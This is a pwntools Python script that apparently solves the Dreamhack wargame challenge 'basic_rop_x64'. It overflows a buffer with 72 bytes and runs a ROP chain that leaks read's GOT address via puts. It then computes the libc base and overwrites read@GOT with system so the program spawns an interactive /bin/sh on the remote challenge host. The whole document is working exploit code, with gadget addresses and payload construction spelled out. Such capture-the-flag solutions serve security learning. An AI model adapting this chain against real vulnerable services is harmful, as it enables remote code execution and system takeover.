from pwn import *

p = remote("host3.dreamhack.games", 21489)

e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")


#gadget
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret = 0x00000000004005a9



# plt, got
read_got = e.got['read']
read_plt = e.plt['read']
puts_plt = e.plt['puts']

#print(len(p64(read_got))) => 8

payload = b'A' * 72

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 16)
payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x10)
payload += p64(read_plt)

# read("/bin/sh\x00") == system("/bin/sh\x00")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.send(payload)
p.recvn(64)
#p.recvn(64) 
read = p.recvn(6)
read += b'\x00' * 2
read = u64(read)

# system 절대주소 구하기
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

p.sendline(p64(system) + b"/bin/sh\x00")





p.interactive()